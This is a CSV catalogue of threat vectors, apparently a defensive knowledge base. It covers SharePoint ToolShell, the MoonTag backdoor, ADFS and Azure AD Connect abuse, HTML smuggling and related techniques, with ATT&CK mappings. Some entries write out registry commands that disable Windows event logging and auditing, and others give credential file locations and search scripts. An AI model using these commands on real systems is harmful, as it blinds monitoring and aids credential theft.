UUID,Name,Type,Tlp,Description,Version,Created,Modified,Childs,Parents,Chaining,Threat Actors,ATT&CK
55227203-38dc-406b-943a-9c1c6023d1cd,SharePoint ToolShell vulnerabilities,Threat Vectors,clear,"SharePoint zero-day vulnerabilities, known also as `ToolShell` are affecting
on-premise Microsoft SharePoint servers, which enable the attackers to
execute code on SharePoint servers without authentication, bypassing
security mechanisms. This vulnerabilities are considered with a high
security risk because they may lead to a remote code execution (RCE)
and a fully compromise of a SharePoint environment. 

What is known until now for these vulnerabilities is that a threat actor
deploys initially a malicious ASPX file `spinstall0.aspx`, also knows as
`SharpyShell`. The malicious file purpose is to extract and leak
cryptographic secrets from the SharePoint server using a simple GET request.
The goal of the threat actor is to obtain the server's MachineKey
configuration, including the critical ValidationKey , which are essential
for generating valid payloads ref [1].    

With these keys, the attackers can effectively turn any authenticated
SharePoint request into a remote code execution opportunity, bypassing the
need for credentials and gaining full control of the server.  

The attacker then uses a tool called `ysoserial` to craft their own valid
SharePoint token for remote code execution with full persistence and no
authentication ref [2].

It was identified successful zero-day exploitation in the SharePoint systems
of at least seven Union entities. But those incidents were not considered
as severe incident because the Defender EDR blocked post-compromise attempts.
Based on the current analysis and investigation there was not detected any
leak of credentials used for post-exploitation activities.

At this moment Microsoft released new SharePoint patches to fix these
vulnerabilities. Microsoft has released security updates that fully protect
customers using all supported versions of SharePoint affected by these two
vulnerabilities. For more information about patching review the customer
guidance for SharePoint vulnerability ref [3],[4].   
",1,2025-07-28,2025-08-16,,,,"[Enterprise] Threat Group-3390, APT27, [Enterprise] ZIRCONIUM, APT31, [Mobile] MoustachedBouncer, Storm-2603","T1190, T1212, T1078"
4110c951-3120-49fb-b54b-3d3aa896296b,MoonTag backdoor,Threat Vectors,clear,"MoonTag is a new backdoor which appears to be recently uploaded
to VirusTotal. The backdoor seems to be in development phase and
uses the Microsoft Graph API, which is a set of APIs provided by
Microsoft for accessing various services and data ref [1].  

It is believed to have been created by a Chinese threat actor,
and it uses code samples for Graph API communication that were
shared in a Chinese language Google Group.

The malware code can be found at the Virus Total page - ref [2],
although none of the provided codes there appear completed.
It seems that several variants of the backdoor have been uploaded
to VirusTotal. All of the variants found contain functionality
for communicating with the MS Graph API. The malware code shows
further that the code uses a technique DLL side-loading in the
processes, for example SvcHostDLL ref [2].   

Examples: 

- install this dll as a Service host by svchost.exe, used by
rundll32.exe to call callback
- dll module handle used to get dll path in InstallService

The malware, which is named “Moon_Tag” by its developer 
is based on code published in a Google Group. All of the
variants found contain functionality for communicating
with the Graph API ref [3].  

MoonTag samples match a YARA rule named `MAL_APT_9002_SabrePanda`
that detects samples from the 9002 RAT malware family used by
a Chinese affiliated threat actor. There are no strong links
to attribute MoonTag to a specific threat actor, but based on
the reports and analytic pages MoonTag backdoor is written by
Chinese-speaking threat actor based on the Chinese language
used in the Google Group post and the infrastructure used
by the attackers ref [3].  

#### MoonTag backdoor known behavior:

- Persistence: The service installation ensures the backdoor remains
on the system across reboots.
- Camouflage: By using legitimate Windows processes like svchost.exe
and the netsvcs service group, it tries to blend in with the operating
system's normal operations.
- Remote Control: The service starts a command-line process (cmd.exe),
allowing an attacker to execute arbitrary commands on the target machine,
which could lead to further exploitation or system takeover.  
",1,2024-10-16,2024-10-24,,,{'sequence::preceeds': ['f3a392f7-3268-4c54-8bfa-8117b784f520']},,"T1219, T1036, T1574.001"
10663f4a-6432-4c8f-bd3a-eaa599bb474e,OneDrive API abuse to exfiltrate sensitive data,Threat Vectors,clear,"OneDrive API abuse to exfiltrate sensitive data occurs when attackers misuse legitimate 
Microsoft Graph API endpoints and OneDrive’s cloud storage features to steal confidential 
or sensitive information from an organization.

### How Does It Work?

1. **API Exploitation via Microsoft Graph**
  - Attackers use the Microsoft Graph API to access users’ OneDrive storage.
  - Common endpoints include:
    - `https://graph.microsoft.com/v1.0/users/{id}/drive` (to list drives)
    - `https://graph.microsoft.com/v1.0/drive/items/{item-id}/content` (to download files)
  - These APIs are normally used for legitimate cloud storage operations.

2. **OAuth and Application Permissions**
  - Attackers may compromise existing OAuth applications or create new ones.
  - By granting these applications broad permissions (like “Files.Read.All” or 
  “Files.ReadWrite.All”), attackers gain access to OneDrive files without direct 
  user interaction.

3. **Use of Trusted Cloud Services**
  - Data exfiltration is carried out through OneDrive, a trusted and widely used 
  cloud service.
  - This makes malicious activity harder to distinguish from normal business operations.

4. **Automated Exfiltration**
  - Attackers often use scripts or malware to automate the process of accessing 
  and transferring files via OneDrive.
  - This allows for large-scale, stealthy data theft.

### Attack Scenarios

- **Compromised Credentials:** An attacker gains access to an account with OneDrive 
API permissions.
- **Malicious OAuth App:** An attacker registers an OAuth app with excessive permissions 
and uses it to access OneDrive files.
- **Automated Scripts:** Attackers use PowerShell or other scripting tools to interact 
with the OneDrive API, extracting sensitive files at scale.
",1,2025-06-25,2025-06-25,,,,,"T1190, T1534"
19a7a12e-1c7a-4885-9359-56abd63c85c9,ADFS abuse,Threat Vectors,clear,"AD FS (Active Directory Federation Services) is a critical identity provider solution 
for secure SSO authentication, but it presents a significant attack surface for 
threat actors. Below is a comprehensive overview of ADFS abuse threat vectors, attack 
techniques, and real-world exploitation patterns based on current research and incident data.

### Memory Adapter Manipulation

Attackers with local administrative privileges on an AD FS server can modify AD 
FS-related .NET assemblies or configuration files (such as those in the Global Assembly Cache). 
By injecting malicious code or altering authentication logic in memory or on disk, 
they can compromise the authentication process, potentially allowing unauthorised access.

### Golden SAML Attacks

Attackers can steal or forge SAML tokens by accessing the AD FS token signing certificates. 
With these certificates, they can create valid SAML tokens impersonating any user, 
granting themselves unauthorised access to federated applications (such as Microsoft 365).

### Phishing & MFA Bypass

Phishing campaigns specifically target AD FS users, tricking them into entering 
credentials on fake login pages. Once credentials are harvested, attackers may intercept 
Multi-Factor Authentication (MFA) codes or session cookies in real time, bypassing 
MFA protections.

### Information Disclosure via Vulnerabilities
  
Historical vulnerabilities (like CVE-2017-0043) have allowed authenticated attackers 
to read sensitive information from AD FS servers via crafted XML requests. While 
many such vulnerabilities are patched, they highlight the risk of information leakage.

### Credential Reuse and Lateral Movement

Attackers who obtain AD FS credentials often find that these credentials are reused 
across other systems or SSO platforms. This allows them to move laterally within 
the victim’s environment, accessing multiple services.
",1,2025-06-24,2025-06-24,,,,,"T1556, T1133, T1606.002"
c698fc79-3ed6-44a7-a9d7-bc447600e4c3,Azure AD Connect abuse,Threat Vectors,clear,"Azure Active Directory (Azure AD) Connect abuse represents a critical threat vector 
in hybrid identity environments, enabling attackers to pivot from on-premises Active 
Directory to cloud environments. Below is a comprehensive analysis of the attack 
methods, techniques, and implications based on current research.    

### Attack Vectors 

**1. Credential Interception via MITM**  
Attackers can perform man-in-the-middle (MITM) attacks against Azure AD Connect's 
Password Hash Sync mechanism. By installing a rogue root CA certificate on the server 
and proxying traffic, they intercept Azure AD Connector credentials sent to `login.microsoftonline.com`. 
This enables extraction of NT hashes for domain users.  

**2. Server Compromise and Malicious Synchronization**  
Compromising the Azure AD Connect server (e.g., via phishing or exploits) allows attackers to:  
- Synchronize malicious objects (e.g., privileged user accounts) to Azure AD.  
- Elevate privileges in the cloud environment, gaining access to sensitive data 
and configurations.    

**3. Password Writeback Misconfiguration**  
Misconfigured Password Writeback permissions (e.g., granting reset rights to privileged 
on-premises accounts like Domain Admins) enables attackers to:  
- Reset passwords of high-privilege accounts via Azure AD.  
- Gain unauthorized access to on-premises resources (CVE-2017-8613).    

**4. Pass-through Authentication (PTA) Abuse**  
Attackers with access to the PTA agent server can:  
- Use tools like **AADInternals** to intercept authentication requests.  
- Register rogue PTA agents with compromised global admin credentials, harvesting 
credentials during authentication.    

**5. AZUREADSSOACC$ Account Exploitation**  
Threat actors leverage the `AZUREADSSOACC$` account's NTLM hash to:  
- Forge Kerberos tickets for synced users.  
- Pivot to Azure AD, especially when synced Global Administrator accounts exist and 
MFA is lax.    

**6. MSOL Account Abuse**  
The 'MSOL_[hash]' service account (used by Azure AD Connect) is a high-value target because it:  
- Has extensive on-premises and cloud permissions (e.g., password reset, DCSync capabilities).  
- Can reset passwords of synced admin accounts, leading to cloud and on-premises compromise. 
",3,2025-06-26,2025-09-08,,,{'support::enabled': ['2743bf18-3b86-4721-bf3e-153dcda0b149']},,"T1556.007, T1098.001, T1078.004"
dbbeb66b-cb18-4055-8af4-808a8efdc748,Disabling of Windows event logging through registry entries,Threat Vectors,clear,"Threat actors can disable Windows event logs by adding, deleting or modifying
registry entries manually or with commands in a command-line prompt. 

The threat actor may disable the Windows Event log events manually via
Event Viewer properties or with CLI commands to disable a specific event or
all of them. Threat actors may also use script files or PowerShell to change
the registry.

If the threat actors want to disable event logging manually via registry
entries, they have to find the associated GUID to the event that will delete. The
GUID can be taken for example from Event Viewer > Select specific event log
> Event Properties > in Details select ""XML view"". (example for GUID id:
Giud=""{BD12F3B8-4DE1-TR31-DE39RET84L12}"") After this the threat actor
navigates to the registry with the GUID that needs to delete and change
the value of the dword in the registry key ""Enabled"" to 0.

Example: 

1. Example for disabling the logging of all event logs via registry entry:

reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog"" /v Start /t REG_DWORD /d 4 /f

2. Example for disabling the logging of a specific event log via registry entry:

reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog[Log Name]"" /v TypesSupported /t REG_DWORD /d 0 /f

3. Manual change in the registry of the registry key ""Enable"" (dword value) to 0. 
  
  Registry: 
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System

  Dword value change in the registry key ""Enable"":

  ""Enabled""=dword:0
  ""EnableProperty""=dword:0

Example for change of Audit policies in the registries:

psexec -s -i regedit (the command needs system-level access to run)
After that in HKLM\SECURITY\Policy\PolAdtEv registry hive in the registry
editor ""Edit Binary Value"", 16-bit (two-byte) values can be changed to
00 00 which means no audit. For example replace the data started with 
01 00 01 00 to 00 00 00 00

- 00 00 means no auditing
- 01 00 means success auditing
- 02 00 means failure auditing
- 03 00 means all auditing
",3,2022-12-22,2023-01-05,,,,"[Enterprise] APT29, UNC2452, [Mobile] Sandworm Team, GreyEnergy",T1562.002
83343a35-daa0-41a2-ae09-6876b3ef9c11,Malicious kernel module,Threat Vectors,clear,"Adversaries may attempt to modify Linux kernel parameters or load/unload kernel 
modules to alter system behavior, hide malicious activities, or install rootkits. 
By operating at the kernel level, attackers can gain persistent and stealthy 
control over a system, intercepting system calls, hiding processes, files, 
or network connections.  

For example, an attacker with root access might execute insmod malicious_module.ko 
to load a malicious kernel module that conceals their presence and activities. 
Kernel rootkits like Adore-ng or Suterusu are examples of tools used for such purposes. 
These rootkits can hide network connections, processes, and files, effectively 
masking the adversary's footprint on the system.
",1,2024-12-03,2024-12-03,,,,"[Enterprise] Turla, Turla, [ICS] APT38, Lazarus Group, [Mobile] APT28, APT28, [Mobile] APT41, APT41, [Enterprise] Equation, Equation Group","T1547.006, T1014"
97589310-35d6-4e7d-a8b5-2d6cfc6375f4,Unauthorized changes on shell configuration files,Threat Vectors,clear,"Attacker may change critical files on Unix-like systems,

* shell initialisation and configuration, such as:
  - `/etc/profile`, `/etc/shells`, `/etc/profile.d/*`, `/etc/bash.bashrc`, 
  `/etc/bashrc`, `/etc/zsh/zprofile`, `/etc/zsh/zshrc`, `/etc/zsh/zlogin`, 
  `/etc/zsh/zlogout`, `/etc/csh.cshrc`, `/etc/csh.login`,
* as well as root-owned configuration files, such as:
  * `/root/.bashrc`, `/root/.bash_profile`, `/root/.profile`, `/root/.zshrc`, 
  `/root/.zprofile`
* and user-specific files, such as:
  * `/home/*/.bashrc`, `/home/*/.zshrc`, `/home/*/.bash_profile`, 
  `/home/*/.zprofile`, `/home/*/.profile`, `/home/*/.bash_login`, 
  `/home/*/.bash_logout`, `/home/*/.zlogin`, `/home/*/.zlogout`

These files are typically executed whenever a user logs in or spawns a new 
shell session. By manipulating these files, attackers may:

1. **Introduce malicious code** by modifying the configuration files with 
the objective of dropping malware to the compromised system, such as 
Backdoors or Trojans.
2. **Alter system settings**: Changes to the configuration files can modify 
system settings, such as environment variables, PATH variables, or other 
critical settings, which can compromise the system's security and integrity.
3. **Disable security features** such as audit logging or access controls, 
to evade detection or gain unauthorized access to the system.
4. **Create unauthorized access**: Modifications to the configuration files 
can create unauthorized access points, such as adding new users or modifying 
existing user accounts.
",1,2025-01-17,2025-01-17,,,,"[Enterprise] TeamTNT, TeamTNT, [Mobile] Sandworm Team, GreyEnergy, [Mobile] APT28, APT28",T1546.004
670504aa-cfb8-4d1f-a5ad-16193822085f,Scheduled task creation using Azure CloudShell,Threat Vectors,clear,"Threat actors can use Azure CloudShell, which is accessible via the Azure
portal or the browser, to create scheduled tasks.

The path to the Action parameter of the scheduled task is set in the task.
Threat actors can also use the Azure CloudShell editor to edit and
visualize in a better format their code before deploying it.

For example, threat actors use ""New-ScheduledTaskTrigger"" cmdlet to create
a trigger for the new scheduled task and further ""New-ScheduledTaskAction""
cmdlet to create a specific action for the task. In the end the 
""Register-ScheduledTask"" cmdlet is used to create the scheduled task. 

$Trigger = New-ScheduledTaskTrigger -Daily -At <time: hh:mm>
$Action = New-ScheduledTaskAction -Execute ""PowerShell.exe"" -Argument ""-File C:\Scripts\My_task_script.ps1""
Register-ScheduledTask -TaskName ""My Task"" -Trigger $Trigger -Action $Action -RunLevel Highest
",4,2022-12-12,2022-12-20,,,,,T1053.005
78d80d14-7260-44b8-95e9-6cf3693b0024,Windows explorer used to search for files with credentials,Threat Vectors,clear,"Credential dumping is the process of extracting sensitive information, such
as passwords, normally in the form of a hash or a clear text content, as well
as any other secrets stored on the compromised host ref [1], [2].         

On Windows, the user's passwords and secrets can be stored in multiple
possible locations, accessible with Windows File Explorer.  

For example:

### Security Accounts Manager (SAM) database location

Location of the SAM database, contains the local users of the host as well
as the local groups: 

`%SystemRoot%/system32/config/SAM`

### Windows Security configuration file

Security config file contains LSA Secrets, for example DPAPI machine key,
account cleartext passwords for Windows services or scheduled tasks that
are configured on the host. Data Protection API (DPAPI) performs symmetric
encryption of asymmetric private keys and it's used by the operation system
to securely store passwords, encryption keys or any other type of sensitive
data ref [3], [4] and [5].        

`%SystemRoot%/system32/config/SECURITY`

### AppData local user folder

AppData in the local user folder contains cleartext passwords,
web browsers cookies and other cached browser data:  

`%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Local\Microsoft\Vault\<GUID>`

### Other possible Windows explorer locations for browsing

Some other paths in Windows Explorer may contain password manager details,
for example KeePass Password Database or similar.  

Examples for paths in Windows Explorer (local locations or network shares):

- `C:\Users\Public\TempWorkingFiles\PGM\Documents\Keepass\`
- `C:\Users\vernada\AppData\Local\Microsoft\AppV\Client\Integration\{identifier_string}\Root`
- `C:\ProgramData\AppV\{identifier_string}\Root\KeePass.exe`
- `C:\Users\USERNAME\Downloads\EBSI credentials\`
- `E:\KeePass-db\`  

### Automated scripts

The threat actors are using automated scripts that can search for specific
file extentions in Windows Explorer that usually contain sensitive data as 
user and system credentials.  

#### Batch script to search for files by a name

Example:

```
@echo off
set /p search_term=Enter search term: 
for /f ""delims="" %%a in ('dir /b /s *%search_term%*') do echo %%a
```

#### PowerShell script to search for files in Windows by content

Example:

```
$search_term = Read-Host ""Enter search term""
Get-ChildItem -Path C:\ -Recurse | Select-String -Pattern $search_term
```

#### Known extentions for files (possible to be discovered via Windows Explorer)

Browsing through Windows Explorer, threat actors are usually looking for
file extentions of files which may contain user's credentials ref [6].  

Example for file extensions that may contain credentials:  

- Compressed (archive) files: .zip, .tar, .gz, .tgz, .rar, and others
- Java source files: .java
- Text files: .txt
- PDF documents: .pdf 
- Office file documents: .doc, .docx, .rtf, .xlsx, .pptx, .pps, .ppsm, .ppsx, .ppt
- Backup files: .bak, .old and others
- Archive files: .7z, .zip , .rar
- Database files: .kd , kdbx, mdb
- Configuration files: .config, .xml, .xsml, .xsl, .xsd, .xps, .sys
- Execution files: .exe, .cmd, .ps1
- Libraries: .dll
- Shell configuration files: .bashrc, .zshrc, .cshrc
- User AWS Folder .aws/credentials
- Other possible files that may contain credentials: csv, tmp, .ssh, .wxs
",1,2025-03-10,2025-03-12,,,,"[Mobile] APT28, APT28, [Enterprise] APT29, APT29, [ICS] OilRig, OilRig","T1003, T1552.001, T1005, T1552"
eca91e9a-616f-4439-ac03-5d0ecc2266df,Non-Approved container image deployed to run cryptominer,Threat Vectors,clear,"A threat actor can gain access to deployment workflows and pipelines and can then abuse acquired access to deploy images of their own choosing to deploy a cryptominer either directly via a malicious image, or by deploying a clean image first and then a cryptominer and C2 Infrastructure",1,2022-06-29,2022-06-29,,,,"[Enterprise] TeamTNT, TeamTNT","T1610, T1525, T1496"
c7ed4fad-a58f-47da-9938-4a673526b3f4,HTML smuggling technique,Threat Vectors,clear,"HTML smuggling is a technique used by attackers to embed a malicious
code within HTML files, which are then smuggled past security controls,
such as firewalls, intrusion detection systems, and web application
firewalls. This is achieved by exploiting the way HTML files are
processed by web browsers.

### How HTML smuggling works?

HTML smuggling uses legitimate features of HTML5 and JavaScript,
which are both supported by all modern browsers, to generate malicious
files behind the firewall. Specifically, HTML smuggling leverages the
HTML5 “download” attribute for anchor tags, as well as the creation
and use of a JavaScript Blob to put together the payload downloaded
into an affected device.

In HTML5, when a user clicks a link, the “download” attribute lets
an HTML file automatically download a file referenced in the “href”
tag. For example, the code below instructs the browser to download
a malicious document from its location and save it into an own
device (save “malicious.docx” to “safe.docx”) ref [1].  

```html
<a href=""/malware/malicious.docx"" download=""safe.docx"">Click</a>
```

In some of the reports and analysis is mentioned that a threat actor
can create an HTML file that contains malicious code, such as JavaScript,
executable files or other type of malicious payload, encoded in a way
that evades detection by security controls. The HTML file is then sent
to the victim's web browser, which processes the file and executes the 
malicious code. The code can be used to download and install malware,
steal sensitive information (PII or other data of interest, belongings
to an organisation or a company), or in some cases to fully take control
of the victim's system ref [2],[3].    

HTML smuggling can be used for malware delivery, for example in an email
to the end user when after execution can deploy a Trojan, RAT, a backdoor
or other type of malware depends on the attacker's goal ref [1]. 

### Different types of HTML smuggling

There are several types of HTML smuggling techniques, for example:

- CSS smuggling - this involves using Cascading Style Sheets (CSS) to
embed malicious code within an HTML file.
- JavaScript smuggling - this involves using JavaScript to embed malicious
code within an HTML file.
- HTML5 smuggling - this involves using HTML5 features, such as the
<canvas> element, to embed malicious code within an HTML file.  
",1,2025-06-30,2025-07-01,,,"{'sequence::succeeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df', 'dd5d942c-bac4-4000-b9a6-ca4fef6cfb84']}","[Enterprise] APT29, APT29","T1190, T1189, T1204, T1027.006"
2d7ed070-e5c5-4796-b150-ea1d02ed1785,Azure - Storage container reconnaissance,Threat Vectors,clear,"Azure storage container reconnaissance is a threat vector involving adversaries 
actively or passively gathering information about Azure Storage accounts and their 
containers to identify potential targets for further exploitation. This reconnaissance 
phase is critical for attackers to map the attack surface, discover misconfigurations, 
and locate storage resources that may be exposed or contain sensitive data.

## Key Techniques Used in Azure Storage Container Reconnaissance

- **Storage Account Discovery**: Attackers enumerate Azure Storage account names 
to find active accounts. Techniques include:
  - Using search engine dorks (e.g., `site:*.blob.core.windows.net`)
  - Brute-force enumeration of account names
  - Leveraging public scanning tools such as Microburst and BlobHunter
  - Crawling for storage endpoints referenced in public websites or code repositories

- **Public Container Discovery**: Once a storage account is identified, attackers 
enumerate container names within that account. They attempt to:
  - List container names by guessing or brute-forcing
  - Use scripts or automated tools to scan for containers with public or misconfigured access

- **DNS/Passive DNS Enumeration**: Attackers query DNS records or use passive DNS 
databases to identify valid Azure Storage account names in the wild. This can reveal 
storage endpoints that may not be directly linked from public sources.

- **Victim-Owned Website Analysis**: Attackers analyze a target’s own websites for 
references or direct links to Azure Storage containers, which can reveal storage 
account URLs and access patterns.

## Tools and Methods

- **Automated Scanning Tools**: Tools like Microburst and BlobHunter automate the 
process of discovering storage accounts and containers by scanning for open or misconfigured 
resources.
- **Scripting and Brute-Force**: Custom scripts may be used to guess container names 
or enumerate access permissions.
- **Search Engine Indexing**: Attackers use indexed URLs from search engines to 
find publicly accessible containers.
",3,2025-05-27,2025-09-08,,,"{'support::enabled': ['53f4e2f0-7d11-4629-bb26-905993a589db', '2743bf18-3b86-4721-bf3e-153dcda0b149', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53063205-4404-4e6d-a2f5-d566c6085d96']}",,"T1530, T1087.004, T1046"
